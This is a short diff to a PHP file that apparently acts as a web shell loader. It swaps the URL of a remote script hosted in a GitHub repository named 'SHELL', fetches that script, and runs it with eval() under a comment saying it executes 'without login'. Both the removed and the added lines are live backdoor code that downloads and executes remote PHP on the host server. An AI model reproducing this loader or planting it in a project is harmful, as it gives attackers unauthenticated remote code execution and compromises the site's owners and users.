@@ -26,6 +26,6 @@ function geturlsinfo($url)
 }
 
 // Directly execute the content without login
-$a = geturlsinfo('https://raw.githubusercontent.com/PsychoXploitGit/SHELL/refs/heads/main/cmd-me.pHp');
+$a = geturlsinfo('https://raw.githubusercontent.com/PsychoXploitGit/SHELL/refs/heads/main/gecko-new.php');
 eval('?>' . $a);
 ?>
